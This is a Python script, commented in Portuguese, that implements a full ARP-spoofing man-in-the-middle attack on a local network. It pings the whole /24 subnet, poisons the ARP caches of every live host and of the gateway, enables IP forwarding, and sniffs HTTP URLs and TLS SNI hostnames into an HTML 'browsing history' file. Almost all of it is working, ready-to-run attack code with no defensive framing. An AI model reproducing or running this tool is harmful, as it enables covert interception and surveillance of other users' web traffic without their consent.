import os
import socket
import struct
import threading
import queue
import time
import fcntl
import array
import ipaddress
from datetime import datetime

# Função para habilitar o encaminhamento de pacotes
def enable_ip_forwarding():
    """
    Habilita o IP Forwarding no Linux.
    """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Função para detectar a interface de rede, IP e máscara
def get_network_info():
    """
    Detecta a interface de rede ativa, IP e máscara de sub-rede.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    max_interfaces = 32
    bytes_needed = max_interfaces * 32
    names = array.array('B', b'\0' * bytes_needed)
    outbytes = struct.unpack('iL', fcntl.ioctl(
        sock.fileno(), 0x8912,  # SIOCGIFCONF
        struct.pack('iL', bytes_needed, names.buffer_info()[0])))[0]
    namestr = names.tobytes()
    interfaces = []

    for i in range(0, outbytes, 40):
        name = namestr[i:i + 16].split(b'\0', 1)[0]
        ip = namestr[i + 20:i + 24]
        try:
            ip_str = socket.inet_ntoa(ip)
            if ip_str.startswith("127."):
                continue
            interfaces.append((name.decode('utf-8'), ip_str))
        except:
            continue

    # Escolhe a primeira interface válida
    if interfaces:
        interface_name = interfaces[0][0]
        ip_address = interfaces[0][1]
        netmask = socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(), 0x891b,  # SIOCGIFNETMASK
            struct.pack('256s', interface_name[:15].encode('utf-8')))[20:24])
        return interface_name, ip_address, netmask
    else:
        raise Exception("Não foi possível encontrar uma interface de rede válida.")

# Função para obter o endereço do gateway padrão
def get_default_gateway():
    """
    Obtém o gateway padrão do sistema.
    """
    with open('/proc/net/route') as f:
        for line in f.readlines():
            parts = line.strip().split()
            if parts[1] == '00000000':
                return socket.inet_ntoa(struct.pack('<L', int(parts[2], 16)))
    return None

# Função para identificar IPs ativos usando ICMP
def ping_worker(ip_queue, active_hosts, lock):
    """
    Thread para verificar IPs ativos na rede.
    """
    while not ip_queue.empty():
        ip = ip_queue.get()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(1)
            packet_id = threading.current_thread().ident & 0xFFFF
            icmp_packet = create_icmp_packet(packet_id)
            sock.sendto(icmp_packet, (ip, 1))
            response, _ = sock.recvfrom(1024)
            if parse_icmp_reply(response, packet_id):
                with lock:
                    active_hosts.append(ip)
        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            ip_queue.task_done()

# Função para criar pacotes ICMP Echo Request
def create_icmp_packet(packet_id):
    """
    Cria um pacote ICMP Echo Request.
    """
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)  # Tipo 8 (Echo Request)
    data = struct.pack('d', time.time())
    checksum = calculate_checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, checksum, packet_id, 1)
    return header + data

# Função para calcular checksum
def calculate_checksum(data):
    """
    Calcula o checksum de pacotes ICMP.
    """
    checksum = 0
    count_to = (len(data) // 2) * 2
    for count in range(0, count_to, 2):
        checksum += (data[count + 1] << 8) + data[count]
    if count_to < len(data):
        checksum += data[-1]
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum += (checksum >> 16)
    return ~checksum & 0xFFFF

# Função para parsear respostas ICMP
def parse_icmp_reply(packet, packet_id):
    """
    Verifica se a resposta ICMP corresponde ao ID do pacote enviado.
    """
    icmp_header = packet[20:28]
    type, _, _, recv_id, _ = struct.unpack('bbHHh', icmp_header)
    return type == 0 and recv_id == packet_id  # Tipo 0 (Echo Reply)

# Função para criar um pacote ARP
def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
    """
    Cria um pacote ARP para spoofing.
    """
    # Verifica e converte os endereços MAC para bytes
    if isinstance(target_mac, str):
        target_mac = bytes.fromhex(target_mac.replace(':', ''))
    if isinstance(sender_mac, str):
        sender_mac = bytes.fromhex(sender_mac.replace(':', ''))

    # Certifica-se de que os endereços MAC têm exatamente 6 bytes
    if len(target_mac) != 6 or len(sender_mac) != 6:
        raise ValueError("Endereços MAC devem ter exatamente 6 bytes")

    # Cabeçalho Ethernet
    ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP

    # Cabeçalho ARP
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1,                                # Hardware type (Ethernet)
        0x0800,                           # Protocol type (IPv4)
        6,                                # Hardware size
        4,                                # Protocol size
        2,                                # Opcode (reply)
        sender_mac,                       # Sender MAC address
        socket.inet_aton(sender_ip),      # Sender IP address
        target_mac,                       # Target MAC address
        socket.inet_aton(target_ip)       # Target IP address
    )

    return ether_header + arp_header

def get_mac(ip, interface):
    """
    Realiza uma resolução ARP para obter o MAC associado a um IP.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((interface, 0))
    mac = None

    for _ in range(10):  # Aumentar o número de tentativas
        try:
            packet = create_arp_packet(ip, b"\xff\xff\xff\xff\xff\xff", "0.0.0.0", b"\x00\x00\x00\x00\x00\x00")
            sock.send(packet)
            sock.settimeout(2)  # Timeout de 2 segundos
            response = sock.recv(65535)
            if response[12:14] == b"\x08\x06":  # Verifica se é um pacote ARP
                sender_ip = socket.inet_ntoa(response[28:32])
                if sender_ip == ip:
                    mac = response[22:28]  # Captura os 6 bytes do endereço MAC
                    sock.close()
                    return mac
        except socket.timeout:
            continue  # Tenta novamente em caso de timeout
    sock.close()
    raise Exception(f"MAC não encontrado para o IP {ip}")


# Função para enviar ARP Spoofing
def arp_spoof(target_ip, gateway_ip, interface):
    """
    Envia pacotes ARP para enganar o host e o roteador.
    """
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    attacker_mac = get_attacker_mac(interface)

    target_packet = create_arp_packet(target_ip, target_mac, gateway_ip, attacker_mac)
    gateway_packet = create_arp_packet(gateway_ip, gateway_mac, target_ip, attacker_mac)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    while True:
        sock.send(target_packet)
        sock.send(gateway_packet)
        time.sleep(2)

# Função para obter o MAC do próprio atacante
def get_attacker_mac(interface):
    """
    Obtém o MAC do próprio atacante na interface especificada.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    mac = sock.getsockname()[4]  # Obtém os primeiros 6 bytes do endereço MAC
    return mac

# Função para capturar tráfego
def capture_traffic(interface, output_file):
    """
    Captura pacotes DNS, HTTP e HTTPS e salva em um relatório HTML com tradução de URLs.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    with open(output_file, "w") as f:
        f.write("<html><header><title>Historico de Navegacao</title></header><body><ul>\n")
        while True:
            packet = sock.recv(65535)
            eth_proto = struct.unpack("!H", packet[12:14])[0]

            if eth_proto == 0x0800:  # IPv4
                ip_header = packet[14:34]
                ip_proto = struct.unpack("!B", ip_header[9:10])[0]
                src_ip = socket.inet_ntoa(ip_header[12:16])
                dest_ip = socket.inet_ntoa(ip_header[16:20])

                if ip_proto == 6:  # TCP (HTTP e HTTPS)
                    tcp_header = packet[34:54]
                    src_port, dest_port = struct.unpack("!HH", tcp_header[0:4])

                    # Processamento de HTTP
                    if dest_port == 80:  # HTTP
                        try:
                            http_data = packet[54:].decode(errors='ignore')
                            headers = http_data.split("\r\n")
                            host = ""
                            path = ""
                            for header in headers:
                                if header.lower().startswith("host:"):
                                    host = header.split(": ")[1]
                                if header.startswith("GET") or header.startswith("POST"):
                                    path = header.split(" ")[1]
                            if host:  # Apenas registra se o host foi identificado
                                url = f"http://{host}{path}" if path else f"http://{host}/"
                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                                f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
                                f.flush()
                        except Exception as e:
                            pass

                    # Processamento de HTTPS
                    elif dest_port == 443:  # HTTPS
                        try:
                            tls_data = packet[54:]
                            if len(tls_data) < 5:  # Verifica se os dados TLS estão presentes
                                continue
                            server_name = extract_sni(tls_data)
                            if server_name:  # Apenas registra se o SNI foi identificado
                                url = f"https://{server_name}/"
                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                                f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
                                f.flush()
                        except Exception as e:
                            pass
        f.write("</ul></body></html>\n")

# Função para extrair o Server Name Indication (SNI)
def extract_sni(tls_data):
    """
    Extrai o Server Name Indication (SNI) de um pacote TLS Client Hello.
    """
    try:
        # Verifica se é um pacote TLS válido e se o tamanho é suficiente
        if len(tls_data) < 45 or tls_data[0] != 0x16 or tls_data[5] != 0x01:  # TLS Handshake + Client Hello
            return None

        # Extensões TLS começam no byte 45
        extensions_length = struct.unpack("!H", tls_data[43:45])[0]
        if len(tls_data) < 45 + extensions_length:  # Verifica se o pacote contém todas as extensões
            return None

        # Procura por SNI nas extensões TLS
        extensions_start = 45
        extensions_end = extensions_start + extensions_length
        extensions_data = tls_data[extensions_start:extensions_end]

        index = 0
        while index < len(extensions_data):
            if len(extensions_data[index:index + 4]) < 4:  # Verifica se há dados suficientes para o tipo e tamanho da extensão
                break
            extension_type = struct.unpack("!H", extensions_data[index:index + 2])[0]
            extension_length = struct.unpack("!H", extensions_data[index + 2:index + 4])[0]

            if extension_type == 0x00:  # SNI encontrado
                if len(extensions_data[index + 4:index + 4 + extension_length]) < extension_length:
                    break
                server_name_length = struct.unpack("!H", extensions_data[index + 9:index + 11])[0]
                if len(extensions_data[index + 11:index + 11 + server_name_length]) < server_name_length:
                    break
                server_name = extensions_data[index + 11:index + 11 + server_name_length].decode('utf-8', errors='ignore')
                return server_name

            index += 4 + extension_length
    except Exception as e:
        print(f"[Erro ao extrair SNI]: {e}")
    return None


# Função principal
def main():
    try:
        # Detectar informações de rede
        interface, ip_address, _ = get_network_info()
        gateway_ip = get_default_gateway()
        if not gateway_ip:
            raise Exception("Não foi possível encontrar o gateway padrão.")

        # Calcular a rede e o range de IPs (usando /24 para pegar todos os dispositivos da rede)
        network = ipaddress.ip_network(ip_address + '/24', strict=False)

        # Habilitar IP Forwarding
        print("[*] Habilitando IP Forwarding...")
        enable_ip_forwarding()

        # Varredura de IPs ativos
        print("[*] Realizando varredura de IPs ativos...")
        ip_queue = queue.Queue()
        active_hosts = []
        lock = threading.Lock()

        # Adicionar IPs à fila
        for host in network.hosts():
            ip_queue.put(str(host))

        # Iniciar threads para varredura
        threads = []
        for _ in range(50):  # Número de threads
            t = threading.Thread(target=ping_worker, args=(ip_queue, active_hosts, lock))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f"[+] IPs ativos detectados: {active_hosts}")

        # Iniciar ARP Spoofing
        print("[*] Iniciando ARP Spoofing...")
        spoof_threads = []
        for ip in active_hosts:
            t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
            spoof_threads.append(t)
            t.start()

        # Iniciar captura de tráfego
        print("[*] Capturando tráfego...")
        capture_traffic(interface, "historico.html")

    except Exception as e:
        print(f"[Erro] {e}")

if __name__ == "__main__":
    main()